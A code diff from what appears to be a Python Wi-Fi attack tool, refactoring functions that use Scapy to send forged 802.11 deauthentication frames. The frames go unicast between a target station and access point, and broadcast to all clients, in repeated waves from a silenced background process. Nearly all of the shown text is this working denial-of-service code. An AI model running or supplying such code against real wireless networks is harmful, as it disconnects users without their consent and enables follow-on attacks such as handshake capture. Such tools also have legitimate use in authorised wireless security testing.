@@ -116,62 +116,54 @@ def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_netw
     '''unicast deauthentication'''
     
     try:
+        def unicast_deauth_parallel():
+            sys.stderr = sys.stdout = None
+            for i in range(deauth_waves):
+                sendrecv.sendp(
+                    dot11.RadioTap() /
+                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
+                    dot11.Dot11Deauth(reason = 7),
+                    iface = wifi_interface,
+                    count = DEAUTH_COUNT,
+                    verbose = False,
+                )
+                sendrecv.sendp(
+                    dot11.RadioTap() /
+                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
+                    dot11.Dot11Deauth(reason = 7),
+                    iface = wifi_interface,
+                    count = DEAUTH_COUNT,
+                    verbose = False,
+                )
         multiprocessing.Process(
-            target = unicast_deauth_process,
-            args = (wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network),
+            target = unicast_deauth_parallel,
         ).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def unicast_deauth_process(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
-    '''unicast deauthentication parallelism'''
-    
-    sys.stderr = sys.stdout = None
-    for i in range(deauth_waves):
-        sendrecv.sendp(
-            dot11.RadioTap() /
-            dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
-            dot11.Dot11Deauth(reason = 7),
-            iface = wifi_interface,
-            count = DEAUTH_COUNT,
-            verbose = False,
-        )
-        sendrecv.sendp(
-            dot11.RadioTap() /
-            dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
-            dot11.Dot11Deauth(reason = 7),
-            iface = wifi_interface,
-            count = DEAUTH_COUNT,
-            verbose = False,
-        )
-
 def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
     '''broadcast deauthentication'''
     
     try:
+        def broadcast_deauth_parallel():
+            sys.stderr = sys.stdout = None
+            for i in range(deauth_waves):
+                sendrecv.sendp(
+                    dot11.RadioTap() /
+                    dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
+                    dot11.Dot11Deauth(reason = 7),
+                    iface = wifi_interface,
+                    count = DEAUTH_COUNT,
+                    verbose = False,
+                )
         multiprocessing.Process(
-            target = broadcast_deauth_process,
-            args = (wifi_interface, deauth_waves, bssid_ap, bssid_network),
+            target = broadcast_deauth_parallel,
         ).start()
         print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
-
-def broadcast_deauth_process(wifi_interface, deauth_waves, bssid_ap, bssid_network):
-    '''broadcast deauthentication parallelism'''
-    
-    sys.stderr = sys.stdout = None
-    for i in range(deauth_waves):
-        sendrecv.sendp(
-            dot11.RadioTap() /
-            dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
-            dot11.Dot11Deauth(reason = 7),
-            iface = wifi_interface,
-            count = DEAUTH_COUNT,
-            verbose = False,
-        )
 
 def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
